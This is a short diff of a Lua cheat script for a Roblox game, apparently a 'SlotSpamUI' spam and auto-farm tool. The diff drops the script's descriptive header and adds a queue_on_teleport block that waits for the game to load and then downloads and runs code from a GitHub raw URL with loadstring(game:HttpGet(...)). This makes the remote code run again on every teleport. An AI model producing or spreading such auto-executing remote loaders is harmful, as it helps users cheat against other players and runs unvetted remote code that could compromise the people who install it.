@@ -1,21 +1,16 @@
---[[
-    SlotSpamUI — CompKiller Edition (Fixed v7)
+queue_on_teleport([[
+    repeat task.wait() until game:IsLoaded()
 
-    Keybinds:
-      LeftAlt  → Toggle UI visibility
-      H        → Toggle Spam ON/OFF
-      J        → Toggle Auto Farm ON/OFF
+    local Players = game:GetService("Players")
+    local lp = Players.LocalPlayer
 
-    FIXES (v7):
-      - Auto Execute: queueteleport now resolved lazily at arm-time (not at
-        script-load time) so it catches executors that expose the global late.
-        Tries every known alias in a pcall chain each time armAutoExecute runs.
-      - Startup walk reduced to 0.7s.
-      - Noclip removed.
-      - Auto Farm TP tightened: shorter wait, position rechecked before
-        teleporting, retries up to 3x if arrival check fails.
-]]
+    repeat task.wait() until lp
+    repeat task.wait() until lp:FindFirstChild("PlayerGui")
 
+    task.wait(5)
+
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/RadiantSkullz/functions/refs/heads/main/AA"))()
+]])
 -- ════════════════════════════════════════════
 --  SERVICES
 -- ════════════════════════════════════════════
